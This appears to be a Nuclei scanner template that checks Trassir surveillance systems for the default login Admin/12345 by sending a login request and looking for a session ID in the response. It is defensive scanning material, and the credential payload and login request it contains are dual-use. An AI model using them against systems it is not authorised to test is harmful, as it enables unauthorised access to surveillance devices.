http:
- attack: clusterbomb
  host-redirects: true
  matchers:
  - case-insensitive: true
    condition: and
    part: body
    type: word
    words:
    - sid
    - 'success" : 1'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 1
  payloads:
    password:
    - 12345
    username:
    - Admin
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}


    username={{username}}&password={{password}}

    '
  stop-at-first-match: true
id: trassir-default-login
info:
  author: gtrrnr, metascan
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: 'Trassir contains a default login vulnerability. An attacker can obtain
    access to user accounts and access sensitive information, modify data, and/or
    execute unauthorized operations.

    '
  metadata:
    verified: 'true'
  name: Trassir - Default Login
  reference:
  - https://confluence.trassir.com/display/TKB/How+to+reset+the+administrator+password+on+the+TRASSIR+NVR
  severity: high
  tags: default-login,trassir
